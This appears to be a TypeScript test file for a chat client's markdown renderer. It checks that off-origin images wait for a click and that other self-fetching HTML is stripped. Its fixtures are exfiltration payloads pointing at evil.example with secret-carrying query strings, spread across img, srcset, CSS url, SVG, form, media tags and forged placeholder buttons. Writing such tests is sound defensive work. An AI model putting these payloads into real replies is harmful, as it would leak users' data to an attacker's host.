// @vitest-environment jsdom
import { describe, expect, it } from "vitest";
import { renderMarkdown, wireImageGate } from "./format.ts";

const render = (md: string): HTMLElement => {
   const div = document.createElement("div");
   div.innerHTML = renderMarkdown(md);
   return div;
};

describe("off-origin images in rendered markdown wait for a click (4.7)", () => {
   it("turns another site's image into a placeholder naming the host, and never sets its src", () => {
      const root = render("![x](https://evil.example/?d=secret)");
      expect(root.querySelector("img")).toBeNull();
      const btn = root.querySelector<HTMLButtonElement>(".md-img-blocked")!;
      expect(btn.textContent).toBe("Image from evil.example · Load");
      expect(root.querySelector("[src]")).toBeNull(); // nothing that loads (data-src is inert)
   });

   it("keeps same-origin and data: images", () => {
      const root = render(`![a](${window.location.origin}/api/images/img_1) ![b](/api/images/img_2) ![c](data:image/png;base64,iVBORw0KGgo=)`);
      expect(root.querySelectorAll("img").length).toBe(3);
      expect(root.querySelector(".md-img-blocked")).toBeNull();
   });

   it("loads on click, and the same URL then stays loaded across re-renders", () => {
      const root = render("![chart](https://cdn.example/chart.png)");
      document.body.appendChild(root);
      const off = wireImageGate(root);
      root.querySelector<HTMLButtonElement>(".md-img-blocked")!.click();
      const img = root.querySelector("img")!;
      expect(img.getAttribute("src")).toBe("https://cdn.example/chart.png");
      expect(img.referrerPolicy).toBe("no-referrer");
      expect(render("![chart](https://cdn.example/chart.png)").querySelector("img")).not.toBeNull(); // a stream re-render
      expect(render("![other](https://cdn.example/other.png)").querySelector("img")).toBeNull(); // only that URL
      off();
      root.remove();
   });

   it("leaves nothing else in reply markdown that fetches by itself", () => {
      const html = [
         '<img src="/x.png" srcset="https://evil.example/?d=S 2x">',
         '<picture><source srcset="https://evil.example/p"><img src="/y.png"></picture>',
         '<video poster="https://evil.example/v" src="https://evil.example/v.mp4"></video>',
         '<audio src="https://evil.example/a.mp3" autoplay></audio>',
         '<input type="image" src="https://evil.example/i">',
         '<p style="background:url(https://evil.example/s)">styled</p>',
         '<table background="https://evil.example/t"><tr><td>x</td></tr></table>',
         '<svg><image href="https://evil.example/svg"/></svg>',
         '<form action="https://evil.example/f"><button>go</button></form>'
      ].join("\n");
      const root = render(html);
      for (const el of Array.from(root.querySelectorAll("*"))) {
         for (const attr of ["srcset", "poster", "style", "background", "action", "href", "xlink:href"]) {
            expect(el.hasAttribute(attr), `${el.tagName} ${attr}`).toBe(false);
         }
         if (el.hasAttribute("src")) expect(el.getAttribute("src")!.startsWith("/") || el.getAttribute("src")!.startsWith(window.location.origin), `${el.tagName} src`).toBe(true);
      }
      expect(root.querySelector("video, audio, source, picture, svg, form, input")).toBeNull();
   });

   it("can't be tricked by a reply's own fake placeholder", () => {
      const root = render(
         '<button type="button" class="md-img-blocked" data-src="https://evil.example/?d=SECRET">Image from cdn.example.com · Load</button>' +
            '<span class="md-img-blocked" data-src="https://evil.example/?d=2" data-gate="x">fake</span>'
      );
      document.body.appendChild(root);
      const off = wireImageGate(root);
      for (const el of Array.from(root.querySelectorAll<HTMLElement>("*"))) el.click();
      expect(root.querySelector("img")).toBeNull();
      expect(root.querySelector(".md-img-blocked")).toBeNull(); // the class and data-* were stripped
      off();
      root.remove();
   });

   it("keeps a task list's done / not-done state without an input", () => {
      const root = render("- [x] done\n- [ ] todo");
      expect(root.querySelector("input")).toBeNull();
      expect(root.textContent).toContain("☑ done");
      expect(root.textContent).toContain("☐ todo");
   });
});
